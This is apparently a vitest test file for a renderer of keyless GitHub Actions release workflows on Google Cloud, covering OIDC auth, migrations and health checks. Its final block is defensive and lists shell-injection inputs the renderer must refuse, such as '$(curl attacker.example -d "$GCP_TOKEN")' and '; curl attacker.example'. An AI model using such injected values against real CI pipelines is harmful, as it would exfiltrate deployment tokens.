import { describe, expect, it } from 'vitest';
import YAML from 'yaml';
import { renderReleaseWorkflow } from '../infrastructure-engine-ci.js';

describe('keyless release workflow', () => {
  const workflow = renderReleaseWorkflow({
    environmentName: 'staging', branch: 'main', gcpProjectId: 'demo-project', region: 'us-central1',
    provider: 'projects/123/locations/global/workloadIdentityPools/hypervibe-github/providers/github',
    releaseIdentity: 'hypervibe-release@demo-project.iam.gserviceaccount.com',
    services: [
      { name: 'web', resource: 'web-abc', healthPath: '/health', image: 'us-central1-docker.pkg.dev/demo-project/hypervibe/staging-web', generatedDockerfile: 'FROM node:22-slim\nCMD ["npm","start"]\n' },
      { name: 'worker', resource: 'worker-abc', kind: 'workerPools', image: 'us-central1-docker.pkg.dev/demo-project/hypervibe/staging-worker', generatedDockerfile: 'FROM node:22-slim\nCMD ["npm","run","worker"]\n' },
    ],
  });
  const parsed = YAML.parse(workflow);

  it('authenticates through OIDC with no stored secret', () => {
    expect(parsed.jobs.release.environment).toBe('staging');
    expect(parsed.permissions).toEqual({ contents: 'read', 'id-token': 'write' });
    expect(workflow).not.toMatch(/secrets\./);
    const auth = parsed.jobs.release.steps.find((step: { uses?: string }) => step.uses?.startsWith('google-github-actions/auth'));
    expect(auth.with.workload_identity_provider).toContain('workloadIdentityPools/hypervibe-github');
  });

  it('keeps production dispatch-only and binds the job to the protected production environment and reviewed ref', () => {
    const workflow = YAML.parse(renderReleaseWorkflow({ environmentName: 'production', branch: 'release', gcpProjectId: 'demo-project', region: 'us-central1',
      provider: 'projects/123/locations/global/workloadIdentityPools/p/providers/g', releaseIdentity: 'release@demo-project.iam.gserviceaccount.com', services: [] }));
    expect(workflow.on).toEqual({ workflow_dispatch: {} });
    expect(workflow.jobs.release.environment).toBe('production');
    expect(workflow.jobs.release.if).toContain('refs/heads/release');
  });

  // #557: only a service whose health path was declared gets the strict rule in its release step.
  it('marks the release step strict only when the service asks for it', () => {
    const steps = YAML.parse(renderReleaseWorkflow({
      environmentName: 'staging', branch: 'main', gcpProjectId: 'demo-project', region: 'us-central1', provider: 'projects/123/locations/global/workloadIdentityPools/hypervibe-github/providers/github',
      releaseIdentity: 'hypervibe-release@demo-project.iam.gserviceaccount.com',
      services: [
        { name: 'web', resource: 'web-abc', healthPath: '/health', strictHealth: true, image: 'us-central1-docker.pkg.dev/demo-project/hypervibe/staging-web' },
        { name: 'api', resource: 'api-abc', healthPath: '/', image: 'us-central1-docker.pkg.dev/demo-project/hypervibe/staging-api' },
      ],
    })).jobs.release.steps;
    const env = (name: string) => steps.find((step: { name?: string }) => step.name === name).env;
    expect(env('Release web').HYPERVIBE_HEALTH_STRICT).toBe('1');
    expect(env('Release api')).not.toHaveProperty('HYPERVIBE_HEALTH_STRICT');
  });

  it('mounts a declared package token into each build from the repository secret of the same name', () => {
    const withToken = YAML.parse(renderReleaseWorkflow({
      environmentName: 'staging', branch: 'main', gcpProjectId: 'demo-project', region: 'us-central1', provider: 'projects/123/locations/global/workloadIdentityPools/hypervibe-github/providers/github',
      releaseIdentity: 'hypervibe-release@demo-project.iam.gserviceaccount.com', packageTokenSecret: 'NODE_AUTH_TOKEN',
      services: [{ name: 'web', resource: 'web-abc', image: 'us-central1-docker.pkg.dev/demo-project/hypervibe/staging-web' }],
    }));
    const build = withToken.jobs.release.steps.find((step: { name?: string }) => step.name === 'Build web');
    expect(build.env).toEqual({ NPM_TOKEN: '${{ secrets.NODE_AUTH_TOKEN }}' });
    expect(build.run).toContain('DOCKER_BUILDKIT=1 docker build --secret id=npm_token,env=NPM_TOKEN');
  });

  it('runs the migration job on the new image, and waits for it, before any service is released', () => {
    const withMigrations = YAML.parse(renderReleaseWorkflow({
      environmentName: 'staging', branch: 'main', gcpProjectId: 'demo-project', region: 'us-central1', provider: 'projects/123/locations/global/workloadIdentityPools/hypervibe-github/providers/github',
      releaseIdentity: 'hypervibe-release@demo-project.iam.gserviceaccount.com', releaseCommand: { job: 'release-command-abc', service: 'web' },
      services: [
        { name: 'web', resource: 'web-abc', image: 'us-central1-docker.pkg.dev/demo-project/hypervibe/staging-web' },
        { name: 'worker', resource: 'worker-abc', kind: 'workerPools', image: 'us-central1-docker.pkg.dev/demo-project/hypervibe/staging-worker' },
      ],
    }));
    const names = withMigrations.jobs.release.steps.map((step: { name?: string }) => step.name).filter(Boolean);
    expect(names).toEqual(['Build web', 'Build worker', 'Run release command', 'Release web', 'Release worker']);
    const migrate = withMigrations.jobs.release.steps.find((step: { name?: string }) => step.name === 'Run release command');
    expect(migrate.env.HYPERVIBE_RUN_JOB).toBe('1');
    expect(migrate.run).toContain('node release.mjs release-command-abc us-central1-docker.pkg.dev/demo-project/hypervibe/staging-web@${{ steps.build_web.outputs.digest }} "" jobs');
    // A failed or unfinished run throws, which stops the workflow before the release steps.
    expect(migrate.run).toContain("base + ':run'");
    expect(migrate.run).toContain('No service was switched');
    expect(parsed.jobs.release.steps.some((step: { name?: string }) => step.name === 'Run release command')).toBe(false);
  });

  it('releases on push with one release at a time and an etag-guarded image-only change', () => {
    expect(parsed.on.push.branches).toEqual(['main']);
    expect(parsed.concurrency).toEqual({ group: 'hypervibe-release-staging', 'cancel-in-progress': false });
    const release = parsed.jobs.release.steps.find((step: { name?: string }) => step.name === 'Release web');
    expect(release.run).toContain("base + '?updateMask=template.containers'");
    expect(release.run).toContain('{ etag: current.etag, template: { containers } }');
    expect(release.run).toContain("node release.mjs web-abc us-central1-docker.pkg.dev/demo-project/hypervibe/staging-web@${{ steps.build_web.outputs.digest }} '/health' services");
  });

  it('builds each service from its own generated Dockerfile when the repository has none', () => {
    const builds = ['web', 'worker'].map((name) => parsed.jobs.release.steps.find((step: { name?: string }) => step.name === `Build ${name}`).run as string);
    expect(builds[0]).toContain('.hypervibe-web.Dockerfile');
    expect(builds[1]).toContain('.hypervibe-worker.Dockerfile');
    expect(builds[0]).toContain('if [ ! -f Dockerfile ]');
    const worker = parsed.jobs.release.steps.find((step: { name?: string }) => step.name === 'Release worker').run as string;
    expect(worker).toMatch(/node release\.mjs worker-abc .+ "" workerPools/);
  });

  // #543: spec values become shell source in steps that hold the release token.
  describe('values that reach the release shell', () => {
    const base = {
      environmentName: 'staging', branch: 'main', gcpProjectId: 'demo-project', region: 'us-central1',
      provider: 'projects/123/locations/global/workloadIdentityPools/hypervibe-github/providers/github',
      releaseIdentity: 'hypervibe-release@demo-project.iam.gserviceaccount.com',
    };
    const web = { name: 'web', resource: 'web-abc', image: 'us-central1-docker.pkg.dev/demo-project/hypervibe/staging-web' };

    it.each(['/$(curl attacker.example -d "$GCP_TOKEN")', '/health\n          curl attacker.example', '/a;env', '/a b', '//attacker.example/x', 'https://attacker.example/x', 'health'])(
      'refuses the health path %j', (healthPath) => {
        expect(() => renderReleaseWorkflow({ ...base, services: [{ ...web, healthPath }] })).toThrow(/health check path/i);
      });

    it('passes an ordinary health path, with a query, as one quoted argument', () => {
      const parsed = YAML.parse(renderReleaseWorkflow({ ...base, services: [{ ...web, healthPath: '/api/health?deep=1&x=y' }] }));
      const release = parsed.jobs.release.steps.find((step: { name?: string }) => step.name === 'Release web');
      expect(release.run).toContain("node release.mjs web-abc us-central1-docker.pkg.dev/demo-project/hypervibe/staging-web@${{ steps.build_web.outputs.digest }} '/api/health?deep=1&x=y' services");
    });

    it.each([
      ['service name', { services: [{ ...web, name: 'web; curl attacker.example' }] }],
      ['resource', { services: [{ ...web, resource: 'web-abc $(env)' }] }],
      ['image', { services: [{ ...web, image: 'registry/x:$(env)' }] }],
      ['release job', { services: [web], releaseCommand: { job: 'job`env`', service: 'web' } }],
      ['environment name', { environmentName: 'staging\nenv:', services: [web] }],
    ])('refuses a %s that is not a plain identifier', (_label, override) => {
      expect(() => renderReleaseWorkflow({ ...base, ...override })).toThrow(/not supported in a workflow/i);
    });
  });
});
